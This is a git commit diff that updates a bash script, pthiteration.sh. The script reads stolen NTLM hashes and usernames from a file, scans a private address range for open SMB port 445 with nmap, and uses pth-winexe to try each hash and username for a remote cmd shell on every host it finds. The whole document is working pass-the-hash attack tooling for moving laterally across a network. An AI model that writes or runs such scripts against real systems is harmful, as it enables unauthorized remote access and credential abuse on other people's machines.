36277580b39a1c7341fe2f3ca737b7d47282b3ab
zachsis <zachary.hatsis@gmail.com>
2014-09-08 23:52:09 -0600

    changes

--- pthiteration.sh
+++ pthiteration.sh
@@ -1,11 +1,13 @@
 #!/bin/bash
 
 
-for smbhash in $(awk -F: '{print $3 ":" $4}' < ~/bin/passcrack/227/hashes ); do 
-
-for host in $(nmap -p 445 192.168.15.200-254 -oG - | grep open | cut -d" " -f2); do 
-    echo "[+] trying $host with $smbhash" 
-    pth-winexe -U Administrator%$smbhash //$host cmd; 
-done
-
+for smbhash in $(awk -F: '{print $3 ":" $4}' < ~/bin/passcrack/227/hashes); do 
+ for username in $(awk -F: '{print $1}' < ~/bin/passcrack/227/hashes); do 
+   for host in $(nmap -p 445 192.168.15.200-254 -oG - | grep open | cut -d" " -f2); do 
+        echo "[+]"
+        echo "[+] trying $username@$host with $smbhash"
+        echo "[+]"
+        pth-winexe -U $username%$smbhash //$host cmd; 
+    done
+  done
 done
